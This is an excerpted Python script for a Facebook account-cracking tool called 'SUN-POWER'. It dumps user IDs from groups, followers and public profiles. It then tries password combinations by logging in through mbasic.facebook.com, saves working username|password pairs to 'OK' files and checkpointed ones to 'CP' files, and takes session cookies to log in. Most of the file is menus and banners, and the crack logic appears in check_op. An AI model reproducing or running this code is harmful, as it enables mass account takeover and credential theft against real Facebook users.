...
sys.stdout.write(f'\x1b[1;35m\x1b]2; ★ SCRIPT BY MR.Azim khan ★\x07')
...
def sex():
  ...
  try: 
    httpCaht = requests.get("https://github.com/nxnil105/Approval.txt/blob/main/Approval.txt").text 
    if id in httpCaht: 
...
class Main():
	...
	def menu_del(self, kataa):
		iprint(Panel(f"{MM}MAIN MENU {QQ}[{CC}{kataa}{QQ}]{MM}THIS IS NOT AVAILABLE... BACK TO MENU", style=Q));time.sleep(3)
		Main()
	def intro(self):
		...
		my_r = my__.add(f"{c}Mr.AZIM KHAN{q}")
		my_rr= my_r.add(f"\r{k}My Github{q}")
		my_rr.add(f"{c}https://github.com/nxnil105{q}")
		my_rr.add(f"{c}https://github.com/nxnil105{q}")

		my_rrr=my_r.add(f"\r{i}My WhatsApp{q}")
		my_rrr.add(f"{b}+8801914436101{q}")
...
HELLO MY KOLIXARA XD"""
		...
		tod=my_rrrrr.add(f"{j}Grouo FACEBOOK{q}")
		tod.add(f"{b}https://facebook.com/groups/866646547166175/{q}")
		tod_=my_rrrrr.add(f"{j}Facebook Page(SUN-POWER){q}")
		tod_.add(f"{b}https://www.facebook.com/Sunpowe99{q}")
		tod_.add(f"{b}https://www.facebook.com/Captain.TaRikuL.420{q}")
		...
		try:
			...
			tod = f"""\033[0;95m=============>W3LCOME SUN-POWER <========================
\033[1;94m~~~~~~~~~~~~~~~~~~>RKNS>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[1;97m
  '\033[91;1m' _____                _____                       
 '\033[91;1m'/ ____|                 |  __ \                      
 \033[91;1m| (___  _   _ _ __ ______| |__) |____      _____ _ __ 
  \033[91;1m\___ \| | | | '_ \______|  ___/ _ \ \ /\ / / _ \ '__|
 \033[91;1m ____) | |_| | | | |     | |  | (_) \ V  V /  __/ |   
\033[91;1m |_____/ \__,_|_| |_|     |_|   \___/ \_/\_/ \___|_|   """
			my_ = Tree("                                 ",highlight=True, hide_root=True)
			my__= my_.add(Group(Panel(tod,title=waktu,style="white on black",box=DOUBLE,padding=1)),guide_style="bold magenta")
			prints(my__)
		...
		data_.add(f"Azim khan Raj     :{u}{waktuu}{q}")
		data_.add(f"Ip Address        :{u}{str(sh['origin'])}{q}")
		data_.add(f"Login MENU :{u}{zza}{q}")
		prints(my__)


		try:open("data/kata","r").read();print(f"{q}╔══════════════════════════════════════════════════════════════════════════════════════╗\n║                            {i}SELAMAT DATANG YANG KE{k} {ka['value']} {q}                             ║\n╚══════════════════════════════════════════════════════════════════════════════════════╝")
		except:open("data/kata","w").write("# WELCOME, THANKS FOR WATCHING");box(f"# WELCOME NEW USER!!", K, C)
...
Crack From Public{QQ}({KK}MASAL{QQ})
Crack From Follow
Crack From Random Email
Crack From Search group 
Crack From Your group(Joined)
Check From Friend
Check Crack Results
Check Options Exit
Log Out This menu (Go out)"""
		lpp = f"""{II}ON
{II}ON
{II}ON
{II}ON
...
#		if ki in ["1","01"]:self.public_v2();os.sys.exit()
		if ki in ["1","01"]:self.public();os.sys.exit()
			...
			tod = f"{MM}Menu CHOICE {QQ}[{CC}{ki}{QQ}] {MM}You Are Not Available.."
	...
	def search_name_groups(self,url):
		...
		tod.add_column("CHOICE", style=M, justify="center", width=60)
		tod.add_row(f"1\n2\n3",f"Crack From old id\nCrack From New account \nCrack From Random{QQ}({II}Recommended{QQ})")
		sol().print(tod, justify='center')

		hu = input(f'>--{c}choice 1-3{q}--> ')
		if hu in ['1','01']:
			for rikod in idd:
				id.append(rikod)
		elif hu in ['2','02']:
	...
	def choice_grub_(self):
		...
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("CHOICE", style=Q, justify="center", width=60)
		tod.add_row(f"1\n2",f"Dump 1 Grub ({II}Dichoice{QQ})\nDump Semua Grub")
		sol().print(tod, justify='center')
		plh = input(q+">--choice 1-2--> "+q)
		if "1" in plh:
			ask = input(f">--choice--> ")
			try:
				kotak("# United  STOP DUMP TEKAM CTRL + C",I,Q)
				number = Id_Grub[int(ask)-1]
				url = "https://mbasic.facebook.com/groups/"+number
				self.dump_grup_no_login(url)
			except:kotak("# SEPERTINYA GRUB YANG ANDA choice PRIVAT/TIDAK PUBLIC",M,Q)
		elif "2" in plh:
			try:
		...
		else:kotak("# MAAF CHOICE ANDA TIDAK ADA !!",M,Q);time.sleep(2);self.choice_grub_()
...
#				idd.append(f"{nama.replace(' ','.')}"+str(x)+"@gmail.co.id"+"<=>"+nama)
	...
	def public_mass(self):
		...
		kotak("# PLEASE ENTER ID/USERNAME TO DISCRACK !!",C,Q)
	...
	def public_v2(self):
		...
		kotak("# SILAHKAN choice TARGET UNTUK DIDUMP !!",C,Q)
		idt = input(f">--{k}Target{q}--> : ")
		idt = jeeck[int(idt)-1]
		limit = ("10000")
		idt = self.ubah_user(idt)
	...
	def follow(self):
		...
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("CHOICE", style=M, justify="center", width=60)
		tod.add_row(f"1\n2\n3",f"Crack from new \nCrack from Old account {QQ}({II}Recommended{QQ}){MM}\nCrack From Random")
		sol().print(tod, justify='center')
		hu = input(f'>--{c}choice 1-3{q}--> ')
		if hu in ['1','01']:
			for rikod in idd:
...
#		except Exception as e:print(e)
	...
	def buat_ugen(self):
		...
		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("CHOICE", style=C, justify="center", width=60)
		tod.add_row(f"1\n2",f"UserAgent Bawaan\nManual")
		sol().print(tod, justify='center')

		choice_ = input(f">--choice 1-5--> {q}")
		if choice_ in ("1","01"):pass
		elif choice_ in ("2","02"):
			try:
			...
			kotak("# MAAF CHOICE ANDA TIDAK DITEMUKAN",M,Q)
			self.buat_ugen()
	...
	def choice_url(self):
		...
		if hu in ['1','01']:
			...
			kotak("# KONCOL TINGGAL choice 1-4 ITU AJA SUSAH, AJIM",C,Q)
			time.sleep(2)
			self.choice_url()
	def choice_mentod_(self):
		global method
		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("CHOICE", style=C, justify="center", width=60)
		tod.add_row(f"1\n2",f"Method 1\nMethod 2")
		sol().print(tod, justify='center')
		hu = input(f'>--{c}choice 1-2{q}--> ')
		if hu in ['1','01']:
			method = "ke1"
		elif hu in ['2','02']:
			method = "ke2"
		else:
			kotak("# KONCOL TINGGAL choice 1-2 ITU AJA SUSAH, AJIM",C,Q)
			time.sleep(2)
			self.choice_mentod_()
#		method = "ke1"

	def choice_mentod(self):
		global method
		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("CHOICE", style=C, justify="center", width=60)
...
#			method = "ke5"
			...
			kotak("# KONCOL TINGGAL choice 1-5 ITU AJA SUSAH, AJIM",C,Q)
			time.sleep(2)
			self.choice_mentod()
...
#		hu = input(f'>--{c}choice 1-2{q}--> ')
		...
		if hu in ['1','01']:
			...
			kotak("# KONCOL TINGGAL choice 1-2 ITU AJA SUSAH, AnJIM",C,Q)
			time.sleep(2)
			self.choice_fps()
	...
	def tanya_prox_k(self):
		...
		if kp in [""," "]:
			...
			tod = f"{MM}Maaf CHOICE {QQ}[{CC}{kp}{QQ}] {MM}Anda Tidak Tersedia.."
			iprint(Panel(tod, style=Q))
	...
	def pas_me(self):
		global pass_
		iprint(Panel(f"{CC}Silahkan choice Kombinasi Password Crack{QQ}", style=Q, title="BACA DULU KONTOL"))
		wwe = me()
		wwe.add_column("NO", style=K, justify="center")
		wwe.add_column("CHOICE", style=C, justify="center", width=60)
		...
		if kol in [" ",""]:
			...
			tod = f"{MM}Maaf CHOICE {QQ}[{CC}{kol}{QQ}] {MM}Anda Tidak Tersedia.."
			iprint(Panel(tod, style=Q))
			time.sleep(3),self.pas_me()
...
def cekfile_crk(folder):
	...
	for file in dirs:
		...
		try:
			ijo__ = filex.split("POWER/OK-")[1]
			ijo_ = (QQ+II+"POWER/OK-"+ijo__)
			god_ok += (ijo_+QQ+" <--|--> "+QQ+MM+total+QQ+"\n")
		except:pass
		try:
			kuning__ = filex.split("SUN/CP-")[1]
			kuning_ = (QQ+KK+"SUN/CP-"+kuning__)
			god_cp += (kuning_+QQ+" <--|--> "+QQ+MM+total+QQ+"\n")
		except:pass
	iprint(Panel(god_ok, style=I, title="POWER-OK"))
	iprint(Panel(god_cp, style=K, title="SUN-CP"))
	print()
...
def check_op(userrz,pwz,ttl,opsi):
	try:
		...
		if "c_user" in ses.cookies:
			...
			open('Power/OK-'+durasi+'.txt','a').write(userrz+"|"+pwz+"\n")
		elif "checkpoint" in ses.cookies:
			form = run.find("form")
			dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
			jzst = form.find("input",{"name":"jazoest"})["value"]
			...
			ngew = [yy.text for yy in xnxx.find_all("option")]
			if(str(len(ngew))=="0"):
				opsi.add(f"{u}HAPPY THIS ACCOUNT TAP YES 😎 {q}({b}Login Diret fb Lite/Mbasic{q})")
				open('POWER/TAP-'+durasi+'.txt','a').write(userrz+"|"+pwz+"|"+ttl+"\n")
			else:
				...
				open('SUN/CP-'+durasi+'.txt','a').write(userrz+"|"+pwz+"|"+ttl+"\n")
		elif "login_error" in str(run):
			oh = run.find("div",{"id":"login_error"}).find("div").text
			opsi.add(f"{k}{oh}{q}")
		else:
		...
		opsi.add(f"{m}Ups.. Looks like this account can't be checked!!{q}")
...
#			cookie = cokxyz[int(ask)-1]
			...
			zxc = json.loads(yz.text)
			nama= zxc["name"]
			kotak(f"# Welcome {nama}.... Hope Your Tokens Last", I, Q)
			iprint(Panel("Login Successfully Using Cookies !!!\Please Type : python3 ROYEL.py"))
			os.sys.exit();break
		except Exception as e:
#			kotak("# COOKIES ERROR !!!",M,Q)
			continue
def login():
	AL = choice([II,KK,MM,UU,JJ,OO,QQ])
	logox = f"""{AL}\033[0;95m=============>W3LCOME SUN-POWER <========================
\033[1;94m~~~~~~~~~~~~~~~~~~>RKNS>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[1;97m
  '\033[91;1m' _____                _____                       
 '\033[91;1m'/ ____|                 |  __ \                      
...
\033[91;1m |_____/ \__,_|_| |_|     |_|   \___/ \_/\_/ \___|_|   """
	...
	iprint(Panel(logox, style=Q, title=f"{CC}Login Enter your Cookies{QQ}"))
	tod = me()
	tod.add_column("NO", style=I, justify="center")
	tod.add_column("CHOICE", style=C, justify="center", width=60)
	tod.add_column("STATUS", style=K, justify="center")
	tod.add_row(f"1\n2","Free Cookies\nLogin your Cookies",f"{II}ON{QQ}\n{II}ON{QQ}")
	sol().print(tod, justify='center')
	pil=input(f">--choice 1-2--> {q}")
	if pil in ("1","01"):
		free_cookies()
#		os.sys.exit("udah dibilang maintenance !")
		...
		kotak("# SORRY THE CHOICE YOU CHOOSE IS NOT AVAILABLE!!",M,Q);time.sleep(3)
		login() 
def login_cok():
	AL = choice([II,KK,MM,UU,JJ,OO,QQ])
	logox = f"""{AL}\033[0;95m=============>W3LCOME SUN-POWER <========================
...
\033[1;97m
 ...
 \033[91;1m ____) | |_| | | | |     | |  | (_) \ V  V /  __/ |   
\033[91;1m |_____/ \__,_|_| |_|     |_|   \___/ \_/\_/ \___|_|   """
	iprint(Panel(logox, style=Q, title=f"{CC}Login Manual Cookies{QQ}"))
	kotak("# ENTER YOUR FRESH COOKIES", K,Q)
	try:
		cokex = input(f">--{c}YOUR COOKIES{q}--> ")
		kotak("# PLEASE BE PATIENT IN CHANGING THE FACEBOOK TOKEN COOKIES",K,Q)
		if cokex in [" ",""]:
		...
		try:
			...
			zxc = json.loads(yz.text)
			nama= zxc["name"]
			kotak(f"# Welcome {name}.... Hope Your Token List", I, Q)
			iprint(Panel("Successfully Login Using Cookies !!!\nPlease Type : python3 ROYEL.py"))
		except Exception as e:
			print(str(e))
			...
			kotak(f"# SORRY THE CHOICE YOU CHOICE IS NOT AVAILABLE {str(e)}", M, Q)
		os.sys.exit()
	except Exception as e:
		kotak(f"# ERROR : {e}", M, Q)
		os.sys.exit()
...
#		self.get_posts(nn)
	...
	def visi_tor(self):
		try:
			url_vis = "https://github.com/nxnil105/xwx/blob/main/README.md"
			url_visi = "https://raw.githubusercontent.com/nxnil105/xwx/main/README.md"
